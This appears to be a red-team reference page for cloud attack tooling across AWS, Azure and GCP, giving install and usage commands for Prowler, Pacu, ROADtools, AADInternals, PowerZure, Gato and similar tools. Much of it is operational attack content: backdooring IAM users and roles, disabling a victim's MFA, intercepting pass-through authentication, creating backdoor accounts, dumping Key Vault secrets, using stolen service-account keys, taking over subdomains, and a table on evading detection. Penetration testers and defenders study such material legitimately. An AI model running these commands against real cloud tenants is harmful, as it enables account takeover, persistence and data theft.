# Cloud Security Tools Reference
> **Category**: Tools
> **Platforms**: AWS / Azure / GCP
> **Required Privileges**: Varies by tool
> **OPSEC Risk**: Low-Medium (reconnaissance tools) to High (exploitation frameworks)

## Strategic Overview

Cloud security tools fall into three categories: assessment tools that enumerate
misconfigurations, exploitation frameworks that automate attack chains, and analysis
tools that visualize IAM relationships and attack paths. A red team lead must curate
a toolkit that covers all three clouds while understanding the detection footprint of
each tool. Assessment tools generate high volumes of API calls that trigger anomaly
detection, while surgical manual techniques may be stealthier for specific objectives.

## Multi-Cloud Assessment Tools

### Prowler -- AWS / Azure / GCP Security Assessment

```bash
# Installation
pip install prowler

# AWS assessment - critical findings only
prowler aws --severity critical
prowler aws --severity critical high --output-formats json-ocsf

# Specific service checks
prowler aws --services iam s3 ec2 lambda
prowler aws --checks iam_root_access_key_exists s3_bucket_public_access

# Azure assessment
prowler azure --severity critical --subscription-ids SUB_ID
prowler azure --services iam storage

# GCP assessment
prowler gcp --severity critical --project-ids PROJECT_ID

# Output to specific formats for reporting
prowler aws --output-formats csv html json-ocsf --output-directory ./prowler-results

# Compliance-focused scans
prowler aws --compliance cis_2.0_aws
prowler azure --compliance cis_2.0_azure
```

### ScoutSuite -- Multi-Cloud Security Auditing

```bash
# Installation
pip install scoutsuite

# AWS scan
scout aws --profile target-profile
scout aws --regions us-east-1 us-west-2

# Azure scan
scout azure --cli    # Uses az CLI authentication
scout azure --user-account --tenant TENANT_ID

# GCP scan
scout gcp --service-account stolen-key.json
scout gcp --user-account --project-id TARGET_PROJECT

# All platforms generate an HTML report in scout-report/
# Open scoutsuite-results/scoutsuite_results_aws-ACCOUNT.html

# Filter by specific services
scout aws --services iam s3 ec2 rds lambda
scout azure --services storageaccounts aad keyvault
```

## AWS-Specific Tools

### CloudFox -- AWS Attack Surface Enumeration

```bash
# Installation
go install github.com/BishopFox/cloudfox@latest

# Enumerate attack surface
cloudfox aws --profile target all-checks

# Specific modules
cloudfox aws --profile target permissions          # Map IAM permissions
cloudfox aws --profile target instances            # EC2 instances with roles
cloudfox aws --profile target lambda               # Lambda functions
cloudfox aws --profile target endpoints            # Public-facing endpoints
cloudfox aws --profile target env-vars             # Environment variables
cloudfox aws --profile target secrets              # Secrets Manager / SSM
cloudfox aws --profile target role-trusts          # Cross-account trusts
cloudfox aws --profile target access-keys          # Access key analysis

# Output to loot directory for further analysis
cloudfox aws --profile target all-checks -o /tmp/cloudfox-loot
```

### Pacu -- AWS Exploitation Framework

```bash
# Installation
pip install pacu

# Initialize and configure
pacu
> import_keys --all  # Import from AWS CLI profiles
> set_keys           # Manually set access keys
> whoami             # Identify current principal

# Enumeration modules
> run iam__enum_permissions              # Current principal's permissions
> run iam__enum_users_roles_policies     # Full IAM enumeration
> run ec2__enum                          # EC2 instances
> run lambda__enum                       # Lambda functions
> run s3__enum                           # S3 buckets

# Privilege escalation
> run iam__privesc_scan                  # Identify escalation paths
> run iam__privesc_scan --method-list    # List all known privesc methods

# Persistence
> run iam__backdoor_users_keys           # Create access keys for users
> run iam__backdoor_users_password       # Set console passwords
> run lambda__backdoor_new_roles         # Backdoor new role creation

# Data exfiltration
> run s3__download_bucket --dl-names bucket1,bucket2
> run ebs__enum_snapshots                # Find shared snapshots
> run rds__explore_snapshots             # Explore RDS snapshots

# Lateral movement
> run organizations__enum               # Enumerate org accounts
> run sts__assume_role                   # Attempt role assumptions
```

### enumerate-iam -- Permission Enumeration

```bash
# Brute-force enumerate permissions for a given set of credentials
git clone https://github.com/andresriancho/enumerate-iam.git

python3 enumerate-iam.py \
  --access-key AKIA... \
  --secret-key wJal... \
  --session-token FwoG...   # Optional for STS credentials

# Output shows which API calls succeed (200) vs fail (403)
# Builds a permission map of what the credentials can do
```

### Principal Mapper (pmapper) -- IAM Relationship Graphing

```bash
# Installation
pip install principalmapper

# Build the IAM graph
pmapper graph --create

# Query for privilege escalation paths
pmapper query "preset privesc *"
pmapper query "who can do iam:CreatePolicyVersion with *"
pmapper query "who can do s3:GetObject with arn:aws:s3:::sensitive-bucket/*"
pmapper query "can arn:aws:iam::ACCT:user/myuser do sts:AssumeRole with *"

# Visualize the IAM graph
pmapper visualize --filetype svg
pmapper visualize --filetype png

# Analysis across the entire graph
pmapper analysis
```

### Cloudsplaining -- AWS IAM Policy Analysis

```bash
# Installation
pip install cloudsplaining

# Download IAM authorization details
cloudsplaining download --profile target -o account-auth.json

# Scan for overprivileged policies
cloudsplaining scan --input-file account-auth.json --output results/
# Generates HTML report with:
# - Privilege escalation risks
# - Resource exposure findings
# - Data exfiltration risks
# - Infrastructure modification risks
```

## Azure-Specific Tools

### ROADtools -- Azure AD Reconnaissance

```bash
# Installation
pip install roadrecon roadlib

# Authenticate
roadrecon auth -u user@target.com -p password
roadrecon auth --device-code    # Device code flow
roadrecon auth -t ACCESS_TOKEN  # Use existing token

# Gather Azure AD data
roadrecon gather                # Collect all objects
roadrecon gather --mfa          # Interactive with MFA support

# Launch analysis GUI
roadrecon gui
# Browse users, groups, apps, service principals, roles at http://localhost:5000

# Dump specific object types
roadrecon dump -t users
roadrecon dump -t applications
roadrecon dump -t servicePrincipals

# Plugin: Analyze conditional access policies
roadrecon plugin policies
```

### AADInternals -- Azure AD Administration & Attack

```powershell
# Installation
Install-Module AADInternals -Force
Import-Module AADInternals

# External reconnaissance (no auth needed)
Invoke-AADIntReconAsOutsider -DomainName target.com

# Authenticated operations
$cred = Get-Credential
Get-AADIntAccessTokenForAADGraph -Credentials $cred

# User and group enumeration
Get-AADIntUsers | Select UserPrincipalName, ObjectId
Get-AADIntGlobalAdmins
Get-AADIntGroups

# MFA manipulation (requires sufficient privileges)
Get-AADIntUserMFA -UserPrincipalName victim@target.com
Set-AADIntUserMFA -UserPrincipalName victim@target.com -State Disabled

# Azure AD Connect operations (on ADConnect server)
Get-AADIntSyncCredentials
Install-AADIntPTASpy         # Intercept Pass-Through Authentication
```

### MicroBurst -- Azure Security Assessment

```powershell
Import-Module MicroBurst.psm1

# External enumeration
Invoke-EnumerateAzureBlobs -Base target
Invoke-EnumerateAzureSubDomains -Base target

# Authenticated enumeration
Get-AzPasswords                     # Extract credentials from multiple sources
Get-AzKeyVaultKeysAndSecrets        # Dump Key Vault contents
Get-AzDomainInfo                    # Azure AD domain information

# Network analysis
Get-AzVirtualNetworkInfo            # VNet enumeration
Get-AzNetworkSecurityGroupInfo      # NSG rules analysis
```

### PowerZure -- Azure Exploitation

```powershell
Import-Module PowerZure.psm1

# Reconnaissance
Get-AzureTargets                    # Enumerate attack surface
Show-AzureCurrentUser               # Current context details

# Exploitation
Get-AzureKeyVaultContent -VaultName target   # Dump secrets
Get-AzureRunbookContent -All                  # Extract runbook code
Get-AzureStorageContent -StorageAccount name   # Storage enumeration

# Operational
Execute-AzureCommand -VMName target -Command "whoami"
New-AzureBackdoor -Username backdoor -Password P@ss!
```

### AzureHound -- BloodHound for Azure

```bash
# Collect Azure AD and Azure RM data for BloodHound analysis
azurehound list -t TENANT_ID -u user@target.com -p password --output azurehound.json

# Alternative: Use refresh token
azurehound list -t TENANT_ID --refresh-token REFRESH_TOKEN -o output.json

# Import into BloodHound Community Edition
# Upload azurehound.json through the BloodHound CE web interface

# Pre-built attack path queries in BloodHound CE:
# - Find all paths to Global Admin
# - Find Azure AD admin paths
# - Find managed identity abuse paths
```

## GCP-Specific Tools

### GCP IAM Privilege Escalation Scanner

```bash
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation.git

# Check for privilege escalation paths
python3 PrivEscScanner/check_for_privesc.py \
  --project TARGET_PROJECT \
  --service-account-credentials stolen-key.json

# Lists all escalation methods available to the compromised identity
```

### Gato -- GitHub Actions Exploitation

```bash
# Gato enumerates and exploits GitHub Actions CI/CD
# Relevant when GitHub Actions uses Workload Identity Federation to GCP/AWS/Azure
pip install gato-cli

# Enumerate organization
gato enumerate --target target-org

# Search for self-hosted runners and secrets
gato enumerate --target target-org --self-hosted-runners
gato search --target target-org --secrets

# Attack: inject into workflow
gato attack --target target-org/target-repo
```

### cf-domain-takeover -- Cloud Subdomain Takeover

```bash
# Check for dangling DNS records pointing to deprovisioned cloud resources
# Supports: S3, Azure Blob, CloudFront, Heroku, GitHub Pages, etc.

cf-domain-takeover -d target.com -o results.txt

# Manual checks:
# CNAME to *.s3.amazonaws.com that returns NoSuchBucket
# CNAME to *.azurewebsites.net that returns 404
# CNAME to *.cloudfront.net with no distribution

dig +short CNAME sub.target.com
# If returns: old-bucket.s3.amazonaws.com
curl -I http://sub.target.com
# If 404/NoSuchBucket: register that bucket name and take over the subdomain
```

## Detection & Evasion

| Tool Category          | API Call Volume | Detection Risk | Mitigation                              |
|------------------------|-----------------|----------------|-----------------------------------------|
| Assessment (Prowler)   | Very High       | High           | Run during business hours; limit scope  |
| Exploitation (Pacu)    | Medium          | Medium         | Use specific modules, not all-checks    |
| Analysis (pmapper)     | Medium          | Medium         | Read-only; simulate before acting       |
| Recon (ROADtools)      | Medium          | Medium         | Gather during initial access window     |
| Manual enumeration     | Low             | Low            | Preferred for stealth engagements       |

## Cross-References

- [Cloud Attack Methodology](cloud-methodology.md)
- [AWS Initial Access](aws/aws-initial-access.md)
- [Azure AD Attacks](azure/azure-ad-attacks.md)
- [GCP Privilege Escalation](gcp/gcp-privilege-escalation.md)

## References

- https://github.com/prowler-cloud/prowler
- https://github.com/nccgroup/ScoutSuite
- https://github.com/BishopFox/cloudfox
- https://github.com/RhinoSecurityLabs/pacu
- https://github.com/dirkjanm/ROADtools
- https://github.com/Gerenios/AADInternals
- https://github.com/NetSPI/MicroBurst
- https://github.com/hausec/PowerZure
- https://github.com/BloodHoundAD/AzureHound
- https://github.com/nccgroup/PMapper
- https://github.com/salesforce/cloudsplaining
